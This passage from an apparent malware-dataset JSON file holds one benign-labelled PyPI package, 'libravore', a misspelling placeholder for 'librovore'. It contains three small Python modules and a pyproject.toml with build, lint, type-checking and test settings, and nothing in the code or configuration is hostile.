        "data/benign_samples/pypi/longtail/libravore/1.0/libravore-1.0/sources/libravore/__/__init__.py": "# vim: set filetype=python fileencoding=utf-8:\n# -*- coding: utf-8 -*-\n\n#============================================================================#\n#                                                                            #\n#  Licensed under the Apache License, Version 2.0 (the \"License\");           #\n#  you may not use this file except in compliance with the License.          #\n#  You may obtain a copy of the License at                                   #\n#                                                                            #\n#      http://www.apache.org/licenses/LICENSE-2.0                            #\n#                                                                            #\n#  Unless required by applicable law or agreed to in writing, software       #\n#  distributed under the License is distributed on an \"AS IS\" BASIS,         #\n#  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.  #\n#  See the License for the specific language governing permissions and       #\n#  limitations under the License.                                            #\n#                                                                            #\n#============================================================================#\n\n\n''' Common constants, imports, and utilities. '''\n\n\nfrom .imports import *\nfrom .nomina import *\n",
        "data/benign_samples/pypi/longtail/libravore/1.0/libravore-1.0/sources/libravore/__/imports.py": "# vim: set filetype=python fileencoding=utf-8:\n# -*- coding: utf-8 -*-\n\n#============================================================================#\n#                                                                            #\n#  Licensed under the Apache License, Version 2.0 (the \"License\");           #\n#  you may not use this file except in compliance with the License.          #\n#  You may obtain a copy of the License at                                   #\n#                                                                            #\n#      http://www.apache.org/licenses/LICENSE-2.0                            #\n#                                                                            #\n#  Unless required by applicable law or agreed to in writing, software       #\n#  distributed under the License is distributed on an \"AS IS\" BASIS,         #\n#  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.  #\n#  See the License for the specific language governing permissions and       #\n#  limitations under the License.                                            #\n#                                                                            #\n#============================================================================#\n\n\n''' Common imports used throughout the package. '''\n\n# ruff: noqa: F401\n\n\nimport collections.abc as cabc\nimport types\n\nimport typing_extensions as typx\n# --- BEGIN: Injected by Copier ---\n# --- END: Injected by Copier ---\n",
        "data/benign_samples/pypi/longtail/libravore/1.0/libravore-1.0/sources/libravore/__/nomina.py": "# vim: set filetype=python fileencoding=utf-8:\n# -*- coding: utf-8 -*-\n\n#============================================================================#\n#                                                                            #\n#  Licensed under the Apache License, Version 2.0 (the \"License\");           #\n#  you may not use this file except in compliance with the License.          #\n#  You may obtain a copy of the License at                                   #\n#                                                                            #\n#      http://www.apache.org/licenses/LICENSE-2.0                            #\n#                                                                            #\n#  Unless required by applicable law or agreed to in writing, software       #\n#  distributed under the License is distributed on an \"AS IS\" BASIS,         #\n#  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.  #\n#  See the License for the specific language governing permissions and       #\n#  limitations under the License.                                            #\n#                                                                            #\n#============================================================================#\n\n\n''' Common names and type aliases. '''\n\n\nfrom . import imports as __\n\n\nComparisonResult: __.typx.TypeAlias = bool | __.types.NotImplementedType\nNominativeArguments: __.typx.TypeAlias = __.cabc.Mapping[ str, __.typx.Any ]\nPositionalArguments: __.typx.TypeAlias = __.cabc.Sequence[ __.typx.Any ]\n\n\npackage_name = __name__.split( '.', maxsplit = 1 )[ 0 ]\n",
        "data/benign_samples/pypi/longtail/libravore/1.0/libravore-1.0/pyproject.toml": "# vim: set filetype=toml fileencoding=utf-8:\n# -*- mode: toml ; coding: utf-8 -*-\n\n[build-system]\nrequires = [\n  'hatchling',\n]\nbuild-backend = 'hatchling.build'\n\n[project]\nname = 'libravore'\ndescription = 'Misspelling of \"librovore\". See the Librovore package instead.'\ndynamic = [ 'version' ]\nlicense = 'Apache-2.0'\nreadme = { 'file' = 'README.rst', 'content-type' = 'text/x-rst' }\nrequires-python = '>= 3.10'\ndependencies = [\n  'librovore',\n  'typing-extensions',\n  # --- BEGIN: Injected by Copier ---\n  # --- END: Injected by Copier ---\n]\nclassifiers = [ # https://pypi.org/classifiers\n  'Development Status :: 4 - Beta',\n  'Intended Audience :: Developers',\n  'License :: OSI Approved :: Apache Software License',\n  'Programming Language :: Python :: 3 :: Only',\n  # --- BEGIN: Injected by Copier ---\n  'Programming Language :: Python :: 3.10',\n  'Programming Language :: Python :: 3.11',\n  'Programming Language :: Python :: 3.12',\n  'Programming Language :: Python :: 3.13',\n  'Programming Language :: Python :: Implementation :: CPython',\n  'Programming Language :: Python :: Implementation :: PyPy',\n  # --- END: Injected by Copier ---\n  'Topic :: Software Development :: Libraries',\n  'Topic :: Utilities',\n]\nkeywords = [ 'redirect', 'compatibility', 'librovore', 'misspelling' ]\n[[project.authors]]\nname = 'Eric McDonald'\nemail = 'emcd@users.noreply.github.com'\n[project.urls]\n'Homepage' = 'https://github.com/emcd/python-libravore'\n'Documentation' = 'https://emcd.github.io/python-libravore'\n'Download' = 'https://pypi.org/project/libravore/#files'\n'Source Code' = 'https://github.com/emcd/python-libravore'\n'Issue Tracker' = 'https://github.com/emcd/python-libravore/issues'\n\n[tool.SELF]\nyear-of-origin = 2025\n\n# https://coverage.readthedocs.io/en/latest/config.html\n[tool.coverage.paths]\ngha-runners = [\n  '/home/runner/work/python-libravore/python-libravore/',\n  '/Users/runner/work/python-libravore/python-libravore/',\n  'C:\\a\\python-libravore\\python-libravore\\',\n  'D:\\a\\python-libravore\\python-libravore\\',\n]\n[tool.coverage.run]\nbranch = true\ncommand_line = '-m pytest'\ndata_file = '.auxiliary/caches/pytest/coverage.sqlite3'\nparallel = true\nsource = [ 'sources' ]\n[tool.coverage.html]\ndirectory = '.auxiliary/artifacts/coverage-pytest'\n[tool.coverage.xml]\noutput = '.auxiliary/artifacts/coverage-pytest/coverage.xml'\n\n# https://hatch.pypa.io/latest/config/metadata/\n[tool.hatch.build]\ndirectory = '.auxiliary/artifacts/hatch-build'\n[tool.hatch.build.targets.sdist]\nonly-include = [\n  'sources/libravore',\n  # --- BEGIN: Injected by Copier ---\n  # --- END: Injected by Copier ---\n]\nstrict-naming = false\n[tool.hatch.build.targets.wheel]\nonly-include = [\n  'sources/libravore',\n  # --- BEGIN: Injected by Copier ---\n  # --- END: Injected by Copier ---\n]\nstrict-naming = false\n[tool.hatch.build.targets.wheel.sources]\n'sources/libravore' = 'libravore'\n# --- BEGIN: Injected by Copier ---\n# --- END: Injected by Copier --- \n[tool.hatch.envs.default]\npython = '3.10'\n[tool.hatch.envs.develop]\ndescription = ''' Development environment. '''\ndependencies = [\n  'Jinja2',\n  'coverage[toml]',\n  'furo',\n  'isort',\n  'packaging',\n  'pre-commit',\n  'pyright',\n  'pytest',\n  'ruff',\n  'sphinx',\n  'sphinx-copybutton',\n  'sphinx-inline-tabs',\n  'towncrier',\n  'vulture',\n  # --- BEGIN: Injected by Copier ---\n  # --- END: Injected by Copier ---\n]\npost-install-commands = [\n  # --- BEGIN: Injected by Copier ---\n  # --- END: Injected by Copier ---\n]\n[tool.hatch.envs.develop.env-vars]\nPYTHONUNBUFFERED = 'TRUE' # TODO: Only for coverage/pytest.\n# --- BEGIN: Injected by Copier ---\n# --- END: Injected by Copier ---\n[tool.hatch.envs.develop.scripts]\ndocsgen = [\n  \"\"\"sphinx-build -E -b linkcheck -d .auxiliary/caches/sphinx --quiet \\\n      documentation .auxiliary/artifacts/sphinx-linkcheck\"\"\",\n  \"\"\"sphinx-build -a -d .auxiliary/caches/sphinx --quiet \\\n      documentation .auxiliary/artifacts/sphinx-html\"\"\",\n]\nlinters = [\n  \"\"\"ruff check --quiet sources documentation tests\"\"\",\n  # --- BEGIN: Injected by Copier ---\n  # --- END: Injected by Copier ---\n  \"\"\"isort --check-only --diff sources tests\"\"\",\n  \"\"\"vulture sources\"\"\",\n  \"\"\"pyright sources\"\"\",\n]\npackagers = [\n  \"\"\"hatch build\"\"\",\n  # --- BEGIN: Injected by Copier ---\n  # --- END: Injected by Copier ---\n]\ntesters-documentation = [\n  \"\"\"coverage run -m sphinx.cmd.build \\\n      -E -b doctest -d .auxiliary/caches/sphinx --quiet \\\n      documentation .auxiliary/artifacts/sphinx-doctest\"\"\",\n]\ntesters-serotine = [ \"\"\"coverage run -m pytest -m slow\"\"\"  ]\ntesters-no-reports = [\n  'coverage run',\n  'testers-documentation',\n  'testers-serotine',\n]\ntesters = [\n  'coverage erase',\n  'testers-no-reports',\n  'coverage combine',\n  'coverage report --skip-covered',\n  'coverage html',\n  'coverage xml',\n]\nmake-all = [\n  'linters',\n  'testers',\n  'packagers',\n  'docsgen',\n]\n[tool.hatch.envs.qa]\ndescription = ''' Quality assurance environment. '''\ntemplate = 'develop'\n[[tool.hatch.envs.qa.matrix]]\npython = [\n    '3.10',\n    '3.11',\n    '3.12',\n    '3.13',\n    'pypy3.10',\n]\n[tool.hatch.version]\npath = 'sources/libravore/__init__.py'\n\n# https://pycqa.github.io/isort/docs/configuration/config_files.html\n[tool.isort]\n# profile = 'black'\nsrc_paths = [ 'sources', 'tests' ]\ncase_sensitive = true\n# ensure_newline_before_comments = true\n# force_sort_within_sections = true\nignore_whitespace = true\ninclude_trailing_comma = true\nknown_first_party = [ 'libravore' ]\nlines_between_types = 1\nline_length = 79\nmulti_line_output = 3\nquiet = true\n# skip_gitignore = true\nskip_glob = [ '*/__/imports.py', '*/__init__.py' ]\nsplit_on_trailing_comma = true\nuse_parentheses = true\n\n# https://mypy.readthedocs.io/en/stable/config_file.html\n[tool.mypy]\n# Note: Due to repeated painful experiences with Mypy, we use Pyright instead.\n#       Pyright properly handles TypeVars, etc...\ncache_dir = '.auxiliary/caches/mypy'\nexclude = [ '.*' ]  # Ignore everything\nignore_errors = true\nfollow_imports = 'skip'\npretty = true\nstrict = false\n\n# https://microsoft.github.io/pyright/#/configuration\n[tool.pyright]\nignore = [ '.auxiliary', 'documentation', 'tests' ] # Ignore diagnostics.\ninclude = [ 'sources', 'tests' ]      # Consider for operations.\nreportConstantRedefinition = true\nreportInvalidTypeVarUse = true\nreportMatchNotExhaustive = true\nreportMissingImports = true\nreportMissingTypeStubs = true\nreportMissingTypeArgument = true\nreportPossiblyUnboundVariable = false # Covered by other linters.\nreportPrivateImportUsage = false      # Covered by other linters.\nreportPrivateUsage = false            # Covered by other linters.\nreportSelfClsParameterName = false    # Too opinionated.\nreportUnknownArgumentType = true\nreportUnknownLambdaType = true\nreportUnknownMemberType = true\nreportUnknownParameterType = true\nreportUnknownVariableType = true\nreportUnnecessaryCast = true\nreportUnnecessaryComparison = true\nreportUntypedBaseClass = true\nreportUntypedClassDecorator = true\nreportUntypedFunctionDecorator = true\nreportUntypedNamedTuple = true\nreportUnusedExpression = true\nreportUnusedImport = false            # Covered by other linters.\nreportUnusedVariable = false          # Covered by other linters.\n#strict = [ 'sources' ]\nstubPath = 'sources/libravore/_typedecls'\n\n[tool.pytest.ini_options]\n# Note: Cannot run doctests from Pytest, because Pytest tries to update '_'\n#       attribute on protected modules. Instead, we use Sphinx to run doctests.\nminversion = '8.1'\naddopts = \"\"\"--capture=no --exitfirst --quiet -rfE -m 'not slow'\"\"\" # TODO? '--fail-under'\ntestpaths = [ 'tests' ]\npython_files = [ 'test_*.py' ]\npython_functions = [ 'test_[0-9][0-9][0-9]_*' ]\ncache_dir = '.auxiliary/caches/pytest'\nmarkers = [\n    \"slow: long-running tests\",\n]\n\n[tool.ruff]\n#builtins = [ 'ic' ]\ncache-dir = '.auxiliary/caches/ruff'\nindent-width = 4\nline-length = 79\n[tool.ruff.lint]\ndummy-variable-rgx = '^_$'\nignore = [\n  'E701',     # multiple-statements-on-one-line-colon\n  'PLC0415',  # import-outside-top-level\n  'SIM300',   # yoda-condition: scarred by assignment expressions, I am\n]\nselect = [ # default: E4, E7, E9, F\n  'A',        # Flake8 builtins rules\n  'B006',     # mutable-argument-default\n  'B008',     # function-call-in-default-argument\n  'B011',     # assert-false\n  'B023',     # function-uses-loop-variable\n  'B904',     # raise-without-from-inside-except\n  'B909',     # PREVIEW: loop-iterator-mutation\n  'C90',      # McCabe complexity rules\n  'E101',     # mixed-spaces-and-tabs\n  'E111',     # PREVIEW: indentation-with-invalid-multiple\n  'E112',     # PREVIEW: no-indented-block\n  'E4',       # Pycodestyle import rules\n  'E501',     # line-too-long\n  'E7',       # Pycodestyle general rules\n  'E9',       # Pycodestyle runtime errors\n  'F',        # Pyflakes rules\n  'PERF',     # Perflint rules\n  'PLC',      # Pylint convention rules\n  'PLE',      # Pylint error rules\n  'PLR',      # Pylint refactor rules\n  'PLW',      # Pylint warning rules\n  'RET',      # Flake8 return rules\n  'RUF',      # Ruff rules\n  'S',        # Flake8 Bandit rules\n  'SIM',      # Flake8 simplify rules\n  'SLF',      # Flake8 self rules\n  'TRY',      # Tryceratops rules\n]\n[tool.ruff.lint.mccabe]\nmax-complexity = 12\n[tool.ruff.lint.per-file-ignores]\n'__init__.py' = [\n  'F401',     # unused-import\n  'F403',     # undefined-local-with-import-star\n  'F405',     # undefined-local-with-import-star-usage\n]\n'tests/**/*.py' = [\n  'PLR0124',  # comparison-with-itself\n  'PLR0913',  # too-many-arguments\n  'PLR0915',  # too-many-statements\n  'PLR1704',  # redefined-argument-from-local\n  'PLR2004',  # magic-value-comparison\n  'PLW0129',  # assert-on-string-literal\n  'PLW0603',  # global-statement\n  'PLW0642',  # self-assignment\n  'S101',     # assert\n  'SLF001',   # private-member-accessed\n  'TRY',      # Tryceratops rules\n]\n[tool.ruff.lint.pylint]\nmax-locals = 10\nmax-public-methods = 10\nmax-statements = 30\n\n[tool.towncrier]\ndirectory = '.auxiliary/data/towncrier'\nfilename = 'documentation/changelog.rst'\npackage = 'libravore'\npackage_dir = 'sources'\n[["
      },
      "package_size_bytes": 17663,
      "num_files": 5,
      "metadata": {
        "package_hash": "pypi_libravore_1.0",
        "malicious_label": 0.0
      }
    }
  ]
}